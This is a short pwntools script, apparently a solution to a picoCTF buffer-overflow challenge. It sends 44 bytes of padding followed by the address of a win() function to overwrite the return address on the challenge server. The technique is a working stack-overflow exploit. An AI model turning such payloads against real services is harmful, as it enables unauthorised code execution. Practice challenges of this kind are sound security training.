from pwn import *

# Replace these with actual challenge values
HOST = "saturn.picoctf.net"  # actual host
PORT = 53973                 # actual port

# Address of the win function — verify if remote binary is different!
win_addr = p32(0x080491f6)

# Create the payload: 44 bytes of padding followed by the address of win()
payload = b"A" * 44 + win_addr

# Connect to the remote challenge
p = remote(HOST, PORT)

# Optional: wait for specific prompt before sending
p.recvuntil(b"Please enter your string:")

# Send the payload
p.sendline(payload)